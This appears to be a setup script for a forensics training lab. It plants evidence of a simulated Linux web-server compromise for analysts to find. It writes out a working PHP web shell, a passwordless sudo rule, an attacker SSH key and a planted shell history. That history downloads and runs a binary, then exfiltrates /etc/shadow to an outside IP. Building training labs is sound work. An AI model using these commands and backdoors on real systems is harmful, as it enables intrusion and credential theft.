#!/bin/bash
# Plants all forensic artifacts for the NFC-SRV-WEB1 compromise scenario

FLAG="NFCSOC{l1nux_srv_c0mpr0m1s3d}"
ATTACKER_IP="185.220.101.45"

# ── Create users ──────────────────────────────────────────────────────────────
useradd -m -s /bin/bash webadmin 2>/dev/null || true
useradd -m -s /bin/bash deploy   2>/dev/null || true
echo "webadmin:Password1!" | chpasswd 2>/dev/null || true

# ── /var/log/auth.log — SSH brute force then successful login ─────────────────
mkdir -p /var/log
cat > /var/log/auth.log << 'AUTHLOG'
Nov 19 09:58:01 NFC-SRV-WEB1 sshd[2301]: Invalid user admin from 185.220.101.45 port 43201 ssh2
Nov 19 09:58:01 NFC-SRV-WEB1 sshd[2301]: Failed password for invalid user admin from 185.220.101.45 port 43201 ssh2
Nov 19 09:58:02 NFC-SRV-WEB1 sshd[2302]: Invalid user root from 185.220.101.45 port 43202 ssh2
Nov 19 09:58:02 NFC-SRV-WEB1 sshd[2302]: Failed password for invalid user root from 185.220.101.45 port 43202 ssh2
Nov 19 09:58:03 NFC-SRV-WEB1 sshd[2303]: Invalid user ubuntu from 185.220.101.45 port 43203 ssh2
Nov 19 09:58:03 NFC-SRV-WEB1 sshd[2303]: Failed password for invalid user ubuntu from 185.220.101.45 port 43203 ssh2
Nov 19 09:58:04 NFC-SRV-WEB1 sshd[2304]: Failed password for webadmin from 185.220.101.45 port 43204 ssh2
Nov 19 09:58:05 NFC-SRV-WEB1 sshd[2305]: Failed password for webadmin from 185.220.101.45 port 43205 ssh2
Nov 19 09:58:07 NFC-SRV-WEB1 sshd[2306]: Failed password for webadmin from 185.220.101.45 port 43206 ssh2
Nov 19 09:58:08 NFC-SRV-WEB1 sshd[2307]: Invalid user ftpuser from 185.220.101.45 port 43207 ssh2
Nov 19 09:58:08 NFC-SRV-WEB1 sshd[2307]: Failed password for invalid user ftpuser from 185.220.101.45 port 43207 ssh2
Nov 19 09:58:09 NFC-SRV-WEB1 sshd[2308]: Invalid user git from 185.220.101.45 port 43208 ssh2
Nov 19 09:58:09 NFC-SRV-WEB1 sshd[2308]: Failed password for invalid user git from 185.220.101.45 port 43208 ssh2
Nov 19 09:58:11 NFC-SRV-WEB1 sshd[2309]: Failed password for webadmin from 185.220.101.45 port 43209 ssh2
Nov 19 09:58:12 NFC-SRV-WEB1 sshd[2310]: Invalid user oracle from 185.220.101.45 port 43210 ssh2
Nov 19 09:58:12 NFC-SRV-WEB1 sshd[2310]: Failed password for invalid user oracle from 185.220.101.45 port 43210 ssh2
Nov 19 09:58:14 NFC-SRV-WEB1 sshd[2311]: Failed password for webadmin from 185.220.101.45 port 43211 ssh2
Nov 19 09:58:15 NFC-SRV-WEB1 sshd[2312]: Failed password for webadmin from 185.220.101.45 port 43212 ssh2
Nov 19 09:58:17 NFC-SRV-WEB1 sshd[2313]: Invalid user test from 185.220.101.45 port 43213 ssh2
Nov 19 09:58:17 NFC-SRV-WEB1 sshd[2313]: Failed password for invalid user test from 185.220.101.45 port 43213 ssh2
Nov 19 09:58:18 NFC-SRV-WEB1 sshd[2314]: Failed password for webadmin from 185.220.101.45 port 43214 ssh2
Nov 19 09:58:20 NFC-SRV-WEB1 sshd[2315]: Invalid user postgres from 185.220.101.45 port 43215 ssh2
Nov 19 09:58:20 NFC-SRV-WEB1 sshd[2315]: Failed password for invalid user postgres from 185.220.101.45 port 43215 ssh2
Nov 19 09:59:01 NFC-SRV-WEB1 sshd[2316]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.45 user=webadmin
Nov 19 09:59:03 NFC-SRV-WEB1 sshd[2316]: Failed password for webadmin from 185.220.101.45 port 43220 ssh2
Nov 19 09:59:05 NFC-SRV-WEB1 sshd[2317]: Failed password for webadmin from 185.220.101.45 port 43221 ssh2
Nov 19 09:59:08 NFC-SRV-WEB1 sshd[2318]: Failed password for webadmin from 185.220.101.45 port 43222 ssh2
Nov 19 10:03:42 NFC-SRV-WEB1 sshd[2389]: Accepted password for webadmin from 185.220.101.45 port 43301 ssh2
Nov 19 10:03:42 NFC-SRV-WEB1 sshd[2389]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
Nov 19 10:03:43 NFC-SRV-WEB1 systemd-logind[1][498]: New session 8 of user webadmin.
Nov 19 10:07:55 NFC-SRV-WEB1 sudo[2441]: webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/bin/bash
Nov 19 10:07:55 NFC-SRV-WEB1 sudo[2441]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1001)
Nov 19 10:08:01 NFC-SRV-WEB1 sshd[2501]: Accepted publickey for root from 185.220.101.45 port 54200 ssh2: RSA SHA256:mW9Y3dKpAttackerKey1234
Nov 19 10:08:01 NFC-SRV-WEB1 sshd[2501]: pam_unix(sshd:session): session opened for user root by (uid=0)
Nov 19 10:15:22 NFC-SRV-WEB1 sshd[2389]: pam_unix(sshd:session): session closed for user webadmin
Nov 19 10:50:05 NFC-SRV-WEB1 CRON[3001]: pam_unix(cron:session): session opened for user webadmin by (uid=0)
Nov 19 10:55:05 NFC-SRV-WEB1 CRON[3002]: pam_unix(cron:session): session opened for user webadmin by (uid=0)
Nov 19 11:00:05 NFC-SRV-WEB1 CRON[3003]: pam_unix(cron:session): session opened for user webadmin by (uid=0)
Nov 19 11:05:05 NFC-SRV-WEB1 CRON[3004]: pam_unix(cron:session): session opened for user webadmin by (uid=0)
AUTHLOG

# ── /var/log/syslog ────────────────────────────────────────────────────────────
cat > /var/log/syslog << 'SYSLOG'
Nov 19 10:03:42 NFC-SRV-WEB1 kernel: [12345.678] nf_conntrack: new connection established
Nov 19 10:07:12 NFC-SRV-WEB1 systemd[1]: Started Session 8 of user webadmin.
Nov 19 10:08:03 NFC-SRV-WEB1 kernel: [12401.001] audit: type=1400 audit(1732010883.001:301): apparmor="ALLOWED" operation="exec" profile="unconfined" name="/tmp/.X11-unix/.cache"
Nov 19 10:08:05 NFC-SRV-WEB1 kernel: [12403.112] audit: type=1400 audit(1732010885.112:302): apparmor="ALLOWED" operation="connect" profile="unconfined" name="/tmp/.X11-unix/.cache" pid=2612 comm=".cache" family=inet socktype=stream protocol=0 requested_mask="send receive" denied_mask="" addr=45.33.32.156
Nov 19 10:08:15 NFC-SRV-WEB1 cron[1234]: (webadmin) RELOAD (crontabs/webadmin)
Nov 19 10:13:44 NFC-SRV-WEB1 kernel: [12982.443] TCP: possible SYN flooding on port 22.
SYSLOG

# ── webadmin bash history ─────────────────────────────────────────────────────
mkdir -p /home/webadmin
cat > /home/webadmin/.bash_history << 'HISTORY'
id
whoami
uname -a
cat /etc/passwd
sudo -l
sudo /bin/bash
cd /tmp
mkdir -p .X11-unix
wget http://45.33.32.156/tools/r.elf -O /tmp/.X11-unix/.cache
ls -la /tmp/.X11-unix/
chmod +x /tmp/.X11-unix/.cache
/tmp/.X11-unix/.cache &
ps aux | grep cache
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.X11-unix/.cache 2>/dev/null") | crontab -
crontab -l
mkdir -p /var/www/html/uploads
echo '<?php if(isset($_REQUEST["cmd"])){echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>";}?>' > /var/www/html/uploads/img001.php
ls -la /var/www/html/uploads/
cat /etc/shadow
cat /etc/shadow | base64 > /tmp/.X11-unix/.s
wc -l /tmp/.X11-unix/.s
curl -s -X POST http://45.33.32.156/exfil -d @/tmp/.X11-unix/.s
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9p3Kk1eW7mT2AttackerSSHPublicKeyHere12345678abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+= attacker@185.220.101.45" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
history -c
exit
HISTORY
chmod 644 /home/webadmin/.bash_history
chown webadmin:webadmin /home/webadmin/.bash_history

# ── Crontab ───────────────────────────────────────────────────────────────────
mkdir -p /var/spool/cron/crontabs
cat > /var/spool/cron/crontabs/webadmin << 'CRON'
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (webadmin) installed on Tue Nov 19 10:08:15 2024
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
*/5 * * * * /tmp/.X11-unix/.cache 2>/dev/null
CRON
chmod 600 /var/spool/cron/crontabs/webadmin

# ── Web shell ─────────────────────────────────────────────────────────────────
mkdir -p /var/www/html/uploads
cat > /var/www/html/index.html << 'HTML'
<!DOCTYPE html><html><body><h1>Nexus Financial Corp — Internal Portal</h1><p>Under maintenance.</p></body></html>
HTML
# Web shell — analyst finds this by grepping for dangerous PHP functions
printf '<?php if(isset($_REQUEST["cmd"])){echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>";}?>' \
    > /var/www/html/uploads/img001.php

# ── SSH backdoor ──────────────────────────────────────────────────────────────
mkdir -p /root/.ssh
chmod 700 /root/.ssh
cat > /root/.ssh/authorized_keys << 'SSHKEY'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9p3Kk1eW7mT2AttackerSSHPublicKeyHere12345678abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+= attacker@185.220.101.45
SSHKEY
chmod 600 /root/.ssh/authorized_keys

# ── Hidden dropper (the payload binary, flag inside) ─────────────────────────
mkdir -p /tmp/.X11-unix
# Fake shadow exfil file (garbled but realistic base64 data)
python3 -c "
import base64
shadow = 'root:!:19684:0:99999:7:::\nwebadmin:\$6\$salt\$hashedpassword:19684:0:99999:7:::\ndeploy:!:19684:0:99999:7:::'
print(base64.b64encode(shadow.encode()).decode())
" > /tmp/.X11-unix/.s

# Flag payload — this is the main hidden file to decode
python3 -c "
import base64, sys
# Simulate binary-looking file with ELF header + embedded flag
elf_header = bytes([0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
flag_b64 = base64.b64encode(b'NFCSOC{l1nux_srv_c0mpr0m1s3d}')
sys.stdout.buffer.write(elf_header)
sys.stdout.buffer.write(b'\x00' * 48)
sys.stdout.buffer.write(b'## PAYLOAD_DATA_START ##\n')
sys.stdout.buffer.write(flag_b64)
sys.stdout.buffer.write(b'\n## PAYLOAD_DATA_END ##\n')
" > /tmp/.X11-unix/.cache
chmod +x /tmp/.X11-unix/.cache

# ── /proc simulated process entry ────────────────────────────────────────────
# We can't fake /proc but we plant a note file the analyst finds via ps output
mkdir -p /tmp/.X11-unix
cat > /tmp/.X11-unix/.pid << 'PID'
2612
PID

# ── sudoers misconfiguration (how attacker escalated) ────────────────────────
echo "webadmin ALL=(ALL) NOPASSWD: /bin/bash" >> /etc/sudoers.d/webadmin-nopasswd
chmod 440 /etc/sudoers.d/webadmin-nopasswd

# ── Copy helper to system ─────────────────────────────────────────────────────
cp /setup/soc_lab.sh /etc/soc_lab.sh
chmod +x /etc/soc_lab.sh

echo "[+] Artifacts planted. NFC-SRV-WEB1 forensics scenario ready."
